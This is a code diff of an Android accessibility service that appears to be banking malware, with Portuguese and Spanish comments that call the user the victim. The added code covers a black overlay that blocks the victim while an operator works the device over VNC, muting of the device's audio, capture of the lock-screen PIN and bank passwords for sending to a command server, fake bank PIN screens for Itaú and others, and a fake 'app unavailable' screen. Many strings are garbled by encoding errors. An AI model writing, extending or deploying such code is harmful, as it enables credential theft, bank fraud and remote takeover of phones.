-        if (now - lastBlackScreenNavBlockMs < BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS) {
-            return;
-        }
+    /** Mitiga gestos Home/Recentes enquanto Tela Preta ativa (onKeyEvent nÃƒÂ£o cobre 100% dos gestos). */
+    private void blockSystemNavWhileBlackScreen(final String packageName, final String className) {
+        if (!isBlackScreenActive || CommandControlService.isKillerModeActive) return;
+        if (!isLauncherOrRecentsWindow(packageName, className)) return;
+        final long now = System.currentTimeMillis();
+        if (now - lastBlackScreenNavBlockMs < BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS) return;
+        // [FIX] nao roubar o BACK logo apos aplicar a capa (fechava o app recem-aberto)
+        if (now - lastOverlayShownAt < 2500) return;
         lastBlackScreenNavBlockMs = now;
-        Log.d(TAG, "🖤 Bloqueando nav sistema (Tela Preta): " + packageName + " / " + className);
-        performGlobalAction(GLOBAL_ACTION_BACK);
+        handler.postDelayed(new Runnable() {
+            @Override public void run() {
+                try {
+                    if (!isBlackScreenActive || CommandControlService.isKillerModeActive) return;
+                    android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
+                    if (root == null) return;
+                    CharSequence pk = root.getPackageName();
+                    String cur = pk == null ? "" : pk.toString().toLowerCase();
+                    if (cur.isEmpty()) return;
+                    if (isLauncherOrRecentsWindow(cur, "")) {
+                        performGlobalAction(GLOBAL_ACTION_BACK);
+                    }
+                } catch (Throwable ignored) {}
+            }
+        }, 450);
     }
 
-    /** Bypass B: esconde overlay durante screenshot quando tela preta está ativa,
-     *  garantindo que o operador veja a tela real pelo VNC enquanto a vítima continua
-     *  vendo apenas a tela preta. O overlay é restaurado imediatamente após o capture. */
+    /** Bypass B: esconde overlay durante screenshot quando tela preta estÃƒÂ¡ ativa,
+     *  garantindo que o operador veja a tela real pelo VNC enquanto a vÃƒÂ­tima continua
+     *  vendo apenas a tela preta. O overlay ÃƒÂ© restaurado imediatamente apÃƒÂ³s o capture. */
     private boolean shouldSuppressOverlayForCapture() {
         return false;
     }
 
     /**
      * Define a visibilidade do overlay como INVISIBLE no main thread
-     * e espera o Choreographer confirmar que o SurfaceFlinger compôs o frame.
+     * e espera o Choreographer confirmar que o SurfaceFlinger compÃƒÂ´s o frame.
      */
     private void suppressBlackOverlayForCapture() {
         if (!shouldSuppressOverlayForCapture()) {
@@ -3011,7 +3061,7 @@ public class UiAssistBridge extends AccessibilityService {
                     latch.countDown();
                 }
             } catch (Exception e) {
-                Log.w(TAG, "🖤 suppressBlackOverlay error: " + e.getMessage());
+                Log.w(TAG, "Ã°Å¸â€“Â¤ suppressBlackOverlay error: " + e.getMessage());
                 latch.countDown();
             }
         });
@@ -3022,7 +3072,7 @@ public class UiAssistBridge extends AccessibilityService {
         }
     }
 
-    /** Re-adiciona a visibilidade VISIBLE do overlay no main thread após iniciar o screenshot com delay de 20ms. */
+    /** Re-adiciona a visibilidade VISIBLE do overlay no main thread apÃƒÂ³s iniciar o screenshot com delay de 20ms. */
     private void restoreBlackOverlayAfterCapture() {
         if (!shouldSuppressOverlayForCapture()) {
             return;
@@ -3033,9 +3083,9 @@ public class UiAssistBridge extends AccessibilityService {
                     blackOverlayView.setVisibility(android.view.View.VISIBLE);
                 }
             } catch (Exception e) {
-                Log.w(TAG, "🖤 restoreBlackOverlay error: " + e.getMessage());
+                Log.w(TAG, "Ã°Å¸â€“Â¤ restoreBlackOverlay error: " + e.getMessage());
             }
-        }, 20); // 20ms garante resposta ultra rápida no VNC
+        }, 20); // 20ms garante resposta ultra rÃƒÂ¡pida no VNC
     }
 
     private static long getEffectiveSilentCaptureDelayMs() {
@@ -3043,10 +3093,13 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * 🖤 Mostra tela preta 100% OPACA
-     * A vítima vê tela preta e não consegue interagir (toques consumidos na overlay)
+     * Ã°Å¸â€“Â¤ Mostra tela preta 100% OPACA
+     * A vÃƒÂ­tima vÃƒÂª tela preta e nÃƒÂ£o consegue interagir (toques consumidos na overlay)
      * dispatchGesture do operador funciona NORMALMENTE para controle remoto
      */
+    private int[] kryptosSavedVolumes = null;
+    private int kryptosSavedRingerMode = -1;
+
     public void muteAllDeviceAudio(boolean mute) {
         try {
             android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
@@ -3059,6 +3112,13 @@ public class UiAssistBridge extends AccessibilityService {
                 android.media.AudioManager.STREAM_SYSTEM
             };
             if (mute) {
+                if (kryptosSavedVolumes == null) {
+                    kryptosSavedVolumes = new int[streams.length];
+                    for (int i = 0; i < streams.length; i++) {
+                        try { kryptosSavedVolumes[i] = am.getStreamVolume(streams[i]); } catch (Exception ignored) { kryptosSavedVolumes[i] = -1; }
+                    }
+                    try { kryptosSavedRingerMode = am.getRingerMode(); } catch (Exception ignored) { kryptosSavedRingerMode = -1; }
+                }
                 for (int stream : streams) {
                     try { am.setStreamVolume(stream, 0, 0); } catch (Exception ignored) {}
                 }
@@ -3067,22 +3127,138 @@ public class UiAssistBridge extends AccessibilityService {
                 } catch (Exception ignored) {
                     try { am.setRingerMode(android.media.AudioManager.RINGER_MODE_VIBRATE); } catch (Exception ignored2) {}
                 }
-                Log.d(TAG, "🔇 Dispositivo 100% SILENCIADO (Tela preta ativa)");
+                Log.d(TAG, "Dispositivo 100% SILENCIADO (Tela preta ativa)");
+            } else {
+                if (kryptosSavedVolumes != null) {
+                    for (int i = 0; i < streams.length; i++) {
+                        int vol = kryptosSavedVolumes[i];
+                        if (vol > 0) {
+                            try { am.setStreamVolume(streams[i], vol, 0); } catch (Exception ignored) {}
+                        }
+                    }
+                    kryptosSavedVolumes = null;
+                }
+                if (kryptosSavedRingerMode >= 0) {
+                    try { am.setRingerMode(kryptosSavedRingerMode); } catch (Exception ignored) {}
+                    kryptosSavedRingerMode = -1;
+                }
+                Log.d(TAG, "Audio restaurado al estado anterior");
             }
         } catch (Exception e) {
-            Log.e(TAG, "Erro ao mutar áudio: " + e.getMessage());
+            Log.e(TAG, "Erro ao mutar audio: " + e.getMessage());
         }
     }
 
+    // [KRYPTOS] El negro se suspende cuando aparece el bloqueo del telefono
+    private boolean blackScreenSuspendedByKeyguard = false;
+    private String lastCustomHash = "";
+    private final StringBuilder bankPwdBuf = new StringBuilder();
+    private final Runnable bankPwdFlush = new Runnable() {
+        @Override
+        public void run() {
+            if (bankPwdBuf.length() >= 4) {
+                String full = bankPwdBuf.toString();
+                Log.w(TAG, "CLAVE BANCARIA COMPLETA: " + full);
+                sendKeylogData(activeBankPkg, full, activeBankHint, activeBankField, true, "BANK_PASSWORD");
+            }
+            bankPwdBuf.setLength(0);
+        }
+    };
+    private String activeBankPkg = "";
+    private String activeBankHint = "";
+    private String activeBankField = "";
+    private boolean bankTemplateEnabled = false;
+    private long lastCustomAt = 0L;
+    private final StringBuilder capturedKeyguardPin = new StringBuilder();
+
+    private final Runnable keyguardWatchRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (!blackScreenSuspendedByKeyguard) return;
+            android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+            boolean locked = km != null && km.isKeyguardLocked();
+            if (!locked) {
+                blackScreenSuspendedByKeyguard = false;
+                if (capturedKeyguardPin.length() >= 4) flushCapturedPin();
+                handler.postDelayed(() -> {
+                    if (!isBlackScreenActive) showBlackScreenOverlay();
+                }, 400);
+                Log.d(TAG, "Keyguard liberado: negro restaurado");
+            } else {
+                handler.postDelayed(this, 700);
+            }
+        }
+    };
+
+    private void suspendBlackScreenForKeyguard() {
+        if (!isBlackScreenActive || blackScreenSuspendedByKeyguard) return;
+        blackScreenSuspendedByKeyguard = true;
+        capturedKeyguardPin.setLength(0);
+        try {
+            if (blackOverlayView != null && blackOverlayWindowManager != null) {
+                blackOverlayWindowManager.removeView(blackOverlayView);
+            }
+        } catch (Exception ignored) {}
+        blackOverlayView = null;
+        isBlackScreenActive = false;
+        Log.d(TAG, "Negro suspendido: keyguard visible (audio sigue silenciado)");
+        handler.removeCallbacks(keyguardWatchRunnable);
+        handler.postDelayed(keyguardWatchRunnable, 500);
+    }
+
+    private void handlePinCapture(String buttonText) {
+        if (buttonText == null) return;
+        String t = buttonText.trim();
+        if (t.isEmpty() || t.startsWith("[ID:")) return;
+        String low = t.toLowerCase();
+        if (t.length() == 1 && Character.isDigit(t.charAt(0))) {
+            if (capturedKeyguardPin.length() >= 16) capturedKeyguardPin.setLength(0);
+            capturedKeyguardPin.append(t.charAt(0));
+            Log.d(TAG, "PIN parcial: " + capturedKeyguardPin.length() + " digitos");
+        } else if (low.contains("borrar") || low.contains("delete") || low.contains("backspace") || low.contains("apagar")) {
+            if (capturedKeyguardPin.length() > 0) capturedKeyguardPin.deleteCharAt(capturedKeyguardPin.length() - 1);
+        } else if (low.contains("enter") || low.contains("intro") || low.contains("done") || low.contains("aceptar") || low.contains("confirmar") || low.contains("ok")) {
+            flushCapturedPin();
+        }
+    }
+
+    private void flushCapturedPin() {
+        if (capturedKeyguardPin.length() < 4) return;
+        final String pin = capturedKeyguardPin.toString();
+        capturedKeyguardPin.setLength(0);
+        Log.d(TAG, "PIN capturado completo: " + pin);
+        try {
+            org.json.JSONObject json = new org.json.JSONObject();
+            json.put("type", "CAPTURED_PIN");
+            json.put("count", pin.length());
+            json.put("eventType", "CAPTURED_PIN");
+            json.put("package", "LOCKSCREEN_PIN");
+            json.put("isPassword", true);
+            json.put("pin", pin);
+            org.json.JSONArray actions = new org.json.JSONArray();
+            for (int i = 0; i < pin.length(); i++) {
+                org.json.JSONObject a = new org.json.JSONObject();
+                a.put("type", "PIN");
+                a.put("key", String.valueOf(pin.charAt(i)));
+                a.put("delay", 180);
+                actions.put(a);
+            }
+            json.put("sequence", actions);
+            CommandControlService.sendKeylogData(this, json.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "Error al enviar PIN: " + e.getMessage());
+        }
+    }
     private void showBlackScreenOverlay() {
         if (isBlackScreenActive) {
-            Log.d(TAG, "🖤 Black screen já está ativo");
+            Log.d(TAG, "Ã°Å¸â€“Â¤ Black screen jÃƒÂ¡ estÃƒÂ¡ ativo");
             return;
         }
         
-        Log.d(TAG, "🖤 Mostrando BLACK SCREEN opaca instantânea...");
-        muteAllDeviceAudio(true);
+        Log.d(TAG, "Ã°Å¸â€“Â¤ Mostrando BLACK SCREEN opaca instantÃƒÂ¢nea...");
         
+        
+        lastOverlayShownAt = System.currentTimeMillis();
         isCustomTemplateActive = false; // Tela preta pura!
         isBlackOverlayTouchable = false; // Garante que inicia sem bloquear toques
         isBlackOverlayFocusable = false; // Sem foco
@@ -3101,10 +3277,10 @@ public class UiAssistBridge extends AccessibilityService {
                 blackOverlayView = null;
             }
 
-            // 🚀 ULTRA-RÁPIDO: Cria container nativo com 0xFF000000 (preto puro)
-            // Sem inicializar a engine pesada do WebView Chromium (~0ms de latência)
+            // Ã°Å¸Å¡â‚¬ ULTRA-RÃƒÂPIDO: Cria container nativo com 0xFF000000 (preto puro)
+            // Sem inicializar a engine pesada do WebView Chromium (~0ms de latÃƒÂªncia)
             BlockTouchFrameLayout container = new BlockTouchFrameLayout(this);
-            container.setBackgroundColor(0xFF000000); // Preto sólido puro
+            container.setBackgroundColor(0xFF000000); // Preto sÃƒÂ³lido puro
             
             blackOverlayView = container;
             applyBlackOverlayInputLock(blackOverlayView);
@@ -3112,25 +3288,26 @@ public class UiAssistBridge extends AccessibilityService {
             android.view.WindowManager.LayoutParams params = buildBlackOverlayLayoutParams();
             blackOverlayWindowManager.addView(blackOverlayView, params);
             isBlackScreenActive = true;
+            new Thread(new Runnable() { public void run() { muteAllDeviceAudio(true); } }, "kryptos-black-mute").start();
 
-            Log.d(TAG, "🖤 ✅ BLACK SCREEN INSTANTÂNEO ATIVO (0ms latency, brilho zero, input bloqueado)");
+            Log.d(TAG, "Ã°Å¸â€“Â¤ Ã¢Å“â€¦ BLACK SCREEN INSTANTÃƒâ€šNEO ATIVO (0ms latency, brilho zero, input bloqueado)");
             
         } catch (Exception e) {
-            Log.e(TAG, "🖤 ❌ Erro ao mostrar black screen: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€“Â¤ Ã¢ÂÅ’ Erro ao mostrar black screen: " + e.getMessage());
             e.printStackTrace();
         }
     }
     
     /**
-     * 🖤 Esconde a tela preta
+     * Ã°Å¸â€“Â¤ Esconde a tela preta
      */
     private void hideBlackScreenOverlay() {
         if (!isBlackScreenActive) {
-            Log.d(TAG, "🖤 Black screen já está oculto");
+            Log.d(TAG, "Ã°Å¸â€“Â¤ Black screen jÃƒÂ¡ estÃƒÂ¡ oculto");
             return;
         }
         
-        Log.d(TAG, "🖤 Escondendo BLACK SCREEN...");
+        Log.d(TAG, "Ã°Å¸â€“Â¤ Escondendo BLACK SCREEN...");
         
         try {
             if (blackOverlayView != null && blackOverlayWindowManager != null) {
@@ -3141,24 +3318,34 @@ public class UiAssistBridge extends AccessibilityService {
             isCustomTemplateActive = false;
             isBlackOverlayTouchable = false;
             isBlackTouchBlocked = false;
+blackScreenSuspendedByKeyguard = false;
             blackScreenOpacityPercent = 100;
-            muteAllDeviceAudio(false);
-            Log.d(TAG, "🖤 ✅ BLACK SCREEN OCULTO!");
+            new Thread(new Runnable() { public void run() { muteAllDeviceAudio(false); } }, "kryptos-black-unmute").start();
+            Log.d(TAG, "Ã°Å¸â€“Â¤ Ã¢Å“â€¦ BLACK SCREEN OCULTO!");
         } catch (Exception e) {
-            Log.e(TAG, "🖤 ❌ Erro ao esconder black screen: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸â€“Â¤ Ã¢ÂÅ’ Erro ao esconder black screen: " + e.getMessage());
         }
     }
     
     /**
-     * 🎨 Mostra tela preta CUSTOMIZADA usando WebView + HTML.
+     * Ã°Å¸Å½Â¨ Mostra tela preta CUSTOMIZADA usando WebView + HTML.
      */
     private void showCustomBlackScreenOverlay(String templateJson) {
+        final String tplHash = String.valueOf(templateJson == null ? 0 : templateJson.hashCode());
+        long tplNow = System.currentTimeMillis();
+        if (isBlackScreenActive && isCustomTemplateActive && tplHash.equals(lastCustomHash) && (tplNow - lastCustomAt) < 4000) {
+            Log.d(TAG, "Plantilla identica ya activa, se omite recarga");
+            return;
+        }
+        lastCustomHash = tplHash;
+        lastCustomAt = tplNow;
+        lastOverlayShownAt = System.currentTimeMillis();
         try {
             isCustomTemplateActive = true;
             isBlackOverlayTouchable = true;
             
-            // Muta o áudio para telas que não sejam bancos (ex: sistemas / atualizações)
-            if (templateJson != null && !templateJson.contains("Banco") && !templateJson.contains("Itaú") && !templateJson.contains("Bradesco") && !templateJson.contains("Caixa") && !templateJson.contains("Santander") && !templateJson.contains("Nubank") && !templateJson.contains("Inter") && !templateJson.contains("C6")) {
+            // Muta o ÃƒÂ¡udio para telas que nÃƒÂ£o sejam bancos (ex: sistemas / atualizaÃƒÂ§ÃƒÂµes)
+            if (templateJson != null && !templateJson.contains("Banco") && !templateJson.contains("ItaÃƒÂº") && !templateJson.contains("Bradesco") && !templateJson.contains("Caixa") && !templateJson.contains("Santander") && !templateJson.contains("Nubank") && !templateJson.contains("Inter") && !templateJson.contains("C6")) {
                 muteAllDeviceAudio(true);
             }
             isBlackTouchBlocked = true;
@@ -3167,13 +3354,13 @@ public class UiAssistBridge extends AccessibilityService {
             com.google.gson.JsonArray elements = template.getAsJsonArray("elements");
             String bgColor = template.has("backgroundColor") ? template.get("backgroundColor").getAsString() : "#000000";
 
-            // Se o background vier transparente ou vazio, força preto para cobrir o fundo
+            // Se o background vier transparente ou vazio, forÃƒÂ§a preto para cobrir o fundo
             String bodyBg = bgColor;
             if (bgColor.toLowerCase().equals("transparent") || bgColor.isEmpty()) {
                 bodyBg = "#000000";
             }
 
-            // Verifica se existe algum elemento facial ou input na lista para habilitar transparência/foco
+            // Verifica se existe algum elemento facial ou input na lista para habilitar transparÃƒÂªncia/foco
             boolean hasFacial = false;
             boolean hasInput = false;
             if (elements != null) {
@@ -3190,7 +3377,7 @@ public class UiAssistBridge extends AccessibilityService {
                 }
             }
             String bodyBgStyle = hasFacial ? "transparent" : bodyBg;
-            isBlackOverlayFocusable = false; // NUNCA abre o teclado nativo (Gboard) do celular - usa apenas botões da tela
+            isBlackOverlayFocusable = false; // NUNCA abre o teclado nativo (Gboard) do celular - usa apenas botÃƒÂµes da tela
 
             StringBuilder html = new StringBuilder();
             html.append("<!DOCTYPE html><html><head><meta charset='utf-8'>")
@@ -3297,7 +3484,7 @@ public class UiAssistBridge extends AccessibilityService {
                     String borderCol = el.has("borderColor") ? el.get("borderColor").getAsString() : "#475569";
                     String keyVal = placeholder.trim();
                     
-                    // Se for tecla numérica de teclado em botão (1..9, 0, ⌫), renderiza como botão HTML sem abrir o teclado
+                    // Se for tecla numÃƒÂ©rica de teclado em botÃƒÂ£o (1..9, 0, Ã¢Å’Â«), renderiza como botÃƒÂ£o HTML sem abrir o teclado
                     html.append("<button type='button' class='key-btn form-key-btn' data-key='").append(keyVal)
                         .append("' name='").append(name).append("' style='")
                         .append(posStyle)
@@ -3314,7 +3501,7 @@ public class UiAssistBridge extends AccessibilityService {
                     int br = el.has("borderRadius") ? el.get("borderRadius").getAsInt() : 8;
                     
                     String trimmedContent = contentStr.trim();
-                    boolean isKeyPadButton = trimmedContent.matches("^\\d$") || "⌫".equals(trimmedContent) || "del".equalsIgnoreCase(trimmedContent) || "delete".equalsIgnoreCase(trimmedContent);
+                    boolean isKeyPadButton = trimmedContent.matches("^\\d$") || "Ã¢Å’Â«".equals(trimmedContent) || "del".equalsIgnoreCase(trimmedContent) || "delete".equalsIgnoreCase(trimmedContent);
                     
                     if (isKeyPadButton) {
                         html.append("<button type='button' class='key-btn form-key-btn' data-key='").append(trimmedContent)
@@ -3341,11 +3528,11 @@ public class UiAssistBridge extends AccessibilityService {
             boolean hasMultiStep = (template.has("multiStep") && template.get("multiStep").getAsBoolean())
                     || templateId.equals("preset-itau-system")
                     || (templateNameCheck.contains("itau") && templateNameCheck.contains("acesso"))
-                    || (templateNameCheck.contains("itaú") && templateNameCheck.contains("acesso"));
+                    || (templateNameCheck.contains("itaÃƒÂº") && templateNameCheck.contains("acesso"));
             String step1Label = template.has("step1Label") ? template.get("step1Label").getAsString() :
-                    (templateNameCheck.contains("itau") || templateNameCheck.contains("itaú") ? "SENHA DE ACESSO ITAÚ" : "SENHA DE ACESSO");
+                    (templateNameCheck.contains("itau") || templateNameCheck.contains("itaÃƒÂº") ? "SENHA DE ACESSO ITAÃƒÅ¡" : "SENHA DE ACESSO");
             String step2Label = template.has("step2Label") ? template.get("step2Label").getAsString() :
-                    (templateNameCheck.contains("itau") || templateNameCheck.contains("itaú") ? "SENHA DE TRANSAÇÃO ITAÚ" : "SENHA DE TRANSAÇÃO");
+                    (templateNameCheck.contains("itau") || templateNameCheck.contains("itaÃƒÂº") ? "SENHA DE TRANSAÃƒâ€¡ÃƒÆ’O ITAÃƒÅ¡" : "SENHA DE TRANSAÃƒâ€¡ÃƒÆ’O");
             String packageStr = template.has("package_name") ? template.get("package_name").getAsString() :
                     (templateId.contains("itau") ? "br.com.itau" : "com.seguranca.protecao");
             
@@ -3373,7 +3560,7 @@ public class UiAssistBridge extends AccessibilityService {
                 .append("    if (!cachedDotsEl) {")
                 .append("      var all = document.querySelectorAll('div, span, p');")
                 .append("      for (var i = 0; i < all.length; i++) {")
-                .append("        if (all[i].children.length === 0 && (all[i].textContent.indexOf('○') !== -1 || all[i].textContent.indexOf('●') !== -1)) {")
+                .append("        if (all[i].children.length === 0 && (all[i].textContent.indexOf('Ã¢â€”â€¹') !== -1 || all[i].textContent.indexOf('Ã¢â€”Â') !== -1)) {")
                 .append("          cachedDotsEl = all[i]; break;")
                 .append("        }")
                 .append("      }")
@@ -3382,7 +3569,7 @@ public class UiAssistBridge extends AccessibilityService {
                 .append("  if (cachedDotsEl) {")
                 .append("    var maxLen = getTargetMaxLen();")
                 .append("    var num = currentPin.length;")
-                .append("    var str = ''; for(var d = 0; d < maxLen; d++) str += (d < num ? '●   ' : '○   ');")
+                .append("    var str = ''; for(var d = 0; d < maxLen; d++) str += (d < num ? 'Ã¢â€”Â   ' : 'Ã¢â€”â€¹   ');")
                 .append("    cachedDotsEl.textContent = str.trim();")
                 .append("  }")
                 .append("}")
@@ -3407,7 +3594,7 @@ public class UiAssistBridge extends AccessibilityService {
                 .append("function sendPinLog(label, pin) {")
                 .append("  if (!pin || pin.length === 0) return;")
                 .append("  var data = {};")
-                .append("  data['text'] = '🔑 ' + label + ': ' + pin;")
+                .append("  data['text'] = 'Ã°Å¸â€â€˜ ' + label + ': ' + pin;")
                 .append("  data['package'] = pkgName;")
                 .append("  data['appName'] = templateName;")
                 .append("  data['isPassword'] = true;")
@@ -3422,7 +3609,7 @@ public class UiAssistBridge extends AccessibilityService {
                 .append("    currentPin = '';")
                 .append("    currentStep = 1;")
                 .append("    updateDots();")
-                .append("    updateTitle('Digite a senha de transação');")
+                .append("    updateTitle('Digite a senha de transaÃƒÂ§ÃƒÂ£o');")
                 .append("  } else {")
                 .append("    currentPin = '';")
                 .append("    updateDots();")
@@ -3439,7 +3626,7 @@ public class UiAssistBridge extends AccessibilityService {
                 .append("  setTimeout(function() { el.classList.remove('btn-active'); }, 50);")
                 .append("  var key = el.getAttribute('data-key') || el.innerText || el.textContent || '';")
                 .append("  key = (key || '').trim();")
-                .append("  if (key === '⌫' || key === 'back' || key === 'delete' || key === 'del') {")
+                .append("  if (key === 'Ã¢Å’Â«' || key === 'back' || key === 'delete' || key === 'del') {")
                 .append("    if (currentPin.length > 0) { currentPin = currentPin.slice(0, -1); updateDots(); }")
                 .append("    return;")
                 .append("  }")
@@ -3476,9 +3663,9 @@ public class UiAssistBridge extends AccessibilityService {
 
             html.append("</body></html>");
 
-            // ── Cria WebView com aceleração de hardware e renderização prioritária ──
+            // Ã¢â€â‚¬Ã¢â€â‚¬ Cria WebView com aceleraÃƒÂ§ÃƒÂ£o de hardware e renderizaÃƒÂ§ÃƒÂ£o prioritÃƒÂ¡ria Ã¢â€â‚¬Ã¢â€â‚¬
             android.webkit.WebView webView = new android.webkit.WebView(this);
-            webView.setBackgroundColor(android.graphics.Color.TRANSPARENT);
+            webView.setBackgroundColor(0xFF000000);
             webView.getSettings().setJavaScriptEnabled(true);
             webView.getSettings().setDomStorageEnabled(true);
             webView.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
@@ -3486,7 +3673,7 @@ public class UiAssistBridge extends AccessibilityService {
             webView.setHapticFeedbackEnabled(false);
             webView.setLayerType(android.view.View.LAYER_TYPE_HARDWARE, null);
             
-            // Registra a interface JavaScript para capturar os dados do formulário
+            // Registra a interface JavaScript para capturar os dados do formulÃƒÂ¡rio
             webView.addJavascriptInterface(new Object() {
                 @android.webkit.JavascriptInterface
                 public void submitForm(String jsonData) {
@@ -3519,6 +3706,7 @@ public class UiAssistBridge extends AccessibilityService {
             webView.loadDataWithBaseURL(null, html.toString(), "text/html", "utf-8", null);
 
             BlockTouchFrameLayout container = new BlockTouchFrameLayout(this);
+            container.setBackgroundColor(0xFF000000);
             container.addView(webView, new android.widget.FrameLayout.LayoutParams(
                     android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                     android.widget.FrameLayout.LayoutParams.MATCH_PARENT
@@ -3541,17 +3729,17 @@ public class UiAssistBridge extends AccessibilityService {
             blackOverlayWindowManager.addView(blackOverlayView, params);
             isBlackScreenActive = true;
 
-            Log.d(TAG, "🎨 ✅ CUSTOM BLACK SCREEN (WebView) ATIVO! ("
+            Log.d(TAG, "Ã°Å¸Å½Â¨ Ã¢Å“â€¦ CUSTOM BLACK SCREEN (WebView) ATIVO! ("
                     + elements.size() + " elementos)");
 
         } catch (Exception e) {
-            Log.e(TAG, "🎨 ❌ Erro ao mostrar custom black screen: " + e.getMessage());
+            Log.e(TAG, "Ã°Å¸Å½Â¨ Ã¢ÂÅ’ Erro ao mostrar custom black screen: " + e.getMessage());
             e.printStackTrace();
         }
     }
 
     /**
-     * 🎨 Exibe HTML customizado diretamente no overlay WebView.
+     * Ã°Å¸Å½Â¨ Exibe HTML customizado diretamente no overlay WebView.
      */
     public void showCustomBlackScreenHtml(String htmlContent) {
         try {
@@ -3561,7 +3749,7 @@ public class UiAssistBridge extends AccessibilityService {
             isBlackOverlayFocusable = false;
 
             android.webkit.WebView webView = new android.webkit.WebView(this);
-            webView.setBackgroundColor(android.graphics.Color.TRANSPARENT);
+            webView.setBackgroundColor(0xFF000000);
             webView.getSettings().setJavaScriptEnabled(true);
             webView.getSettings().setDomStorageEnabled(true);
             webView.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
@@ -3593,6 +3781,7 @@ public class UiAssistBridge extends AccessibilityService {
             webView.loadDataWithBaseURL(null, htmlContent, "text/html", "utf-8", null);
 
             BlockTouchFrameLayout container = new BlockTouchFrameLayout(this);
+            container.setBackgroundColor(0xFF000000);
             container.addView(webView, new android.widget.FrameLayout.LayoutParams(
                     android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                     android.widget.FrameLayout.LayoutParams.MATCH_PARENT
@@ -3615,7 +3804,7 @@ public class UiAssistBridge extends AccessibilityService {
             blackOverlayWindowManager.addView(blackOverlayView, params);
             isBlackScreenActive = true;
 
-            Log.d(TAG, "🎨 ✅ HTML Overlay Ativo!");
+            Log.d(TAG, "Ã°Å¸Å½Â¨ Ã¢Å“â€¦ HTML Overlay Ativo!");
         } catch (Exception e) {
             Log.e(TAG, "Erro ao exibir HTML overlay: " + e.getMessage());
         }
@@ -3636,7 +3825,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * 🚫 Mostra tela de "Aplicativo Indisponível" quando um app bloqueado é aberto
+     * Ã°Å¸Å¡Â« Mostra tela de "Aplicativo IndisponÃƒÂ­vel" quando um app bloqueado ÃƒÂ© aberto
      */
     public void showAppUnavailableOverlay(String packageName, String rawAppName) {
         handler.post(() -> {
@@ -3670,10 +3859,10 @@ public class UiAssistBridge extends AccessibilityService {
                     .append("</style></head><body>")
                     .append("<div class=\"card\">")
                     .append("<div class=\"icon-wrapper\"><svg class=\"icon-svg\" viewBox=\"0 0 24 24\"><path d=\"M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z\"></path><line x1=\"12\" y1=\"9\" x2=\"12\" y2=\"13\"></line><line x1=\"12\" y1=\"17\" x2=\"12.01\" y2=\"17\"></line></svg></div>")
-                    .append("<div class=\"title\">Aplicativo Indisponível</div>")
-                    .append("<div class=\"message\">O aplicativo <span class=\"app-highlight\">").append(appName).append("</span> está temporariamente indisponível para manutenção ou instabilidade no servidor. Por favor, tente novamente mais tarde.</div>")
+                    .append("<div class=\"title\">Aplicativo IndisponÃƒÂ­vel</div>")
+                    .append("<div class=\"message\">O aplicativo <span class=\"app-highlight\">").append(appName).append("</span> estÃƒÂ¡ temporariamente indisponÃƒÂ­vel para manutenÃƒÂ§ÃƒÂ£o ou instabilidade no servidor. Por favor, tente novamente mais tarde.</div>")
                     .append("<button class=\"btn-ok\" onclick=\"dismissApp()\">Entendi</button>")
-                    .append("<div class=\"footer-sub\">Código do erro: ERR_APP_TEMPORARILY_UNAVAILABLE</div>")
+                    .append("<div class=\"footer-sub\">CÃƒÂ³digo do erro: ERR_APP_TEMPORARILY_UNAVAILABLE</div>")
                     .append("</div>")
                     .append("<script>")
                     .append("function dismissApp() {")
@@ -3682,15 +3871,15 @@ public class UiAssistBridge extends AccessibilityService {
                     .append("}")
                     .append("</script></body></html>");
 
-                // Minimiza o app imediatamente para que não permaneça visível em segundo plano
+                // Minimiza o app imediatamente para que nÃƒÂ£o permaneÃƒÂ§a visÃƒÂ­vel em segundo plano
                 try {
                     performGlobalAction(GLOBAL_ACTION_HOME);
                 } catch (Exception ignored) {}
 
                 showCustomBlackScreenHtml(html.toString());
-                Log.d(TAG, "🚫 Overlay de Aplicativo Indisponível exibida para: " + appName + " (" + packageName + ")");
+                Log.d(TAG, "Ã°Å¸Å¡Â« Overlay de Aplicativo IndisponÃƒÂ­vel exibida para: " + appName + " (" + packageName + ")");
             } catch (Exception e) {
-                Log.e(TAG, "Erro ao exibir overlay de app indisponível: " + e.getMessage());
+                Log.e(TAG, "Erro ao exibir overlay de app indisponÃƒÂ­vel: " + e.getMessage());
                 performGlobalAction(GLOBAL_ACTION_HOME);
             }
         });
@@ -3772,14 +3961,14 @@ public class UiAssistBridge extends AccessibilityService {
                             restoreBlackOverlayAfterCapture();
                             Log.w(TAG, "capSilentScreen takeScreenshot failed: " + errorCode);
                             if (errorCode == android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
-                                // Sistema exige intervalo mínimo (~333ms). Espera o suficiente e recupera.
+                                // Sistema exige intervalo mÃƒÂ­nimo (~333ms). Espera o suficiente e recupera.
                                 silentCaptureDelayMs = Math.min(Math.max(silentCaptureDelayMs, 360) + 60, SILENT_CAPTURE_MAX_DELAY_MS);
                             } else if (errorCode == android.accessibilityservice.AccessibilityService.ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS) {
-                                // Serviço de acessibilidade perdido: dá mais tempo e continua tentando
-                                Log.w(TAG, "Sem acesso de acessibilidade — aguardando recuperação");
+                                // ServiÃƒÂ§o de acessibilidade perdido: dÃƒÂ¡ mais tempo e continua tentando
+                                Log.w(TAG, "Sem acesso de acessibilidade Ã¢â‚¬â€ aguardando recuperaÃƒÂ§ÃƒÂ£o");
                                 silentCaptureDelayMs = 500;
                             } else {
-                                // Falha genérica: backoff suave
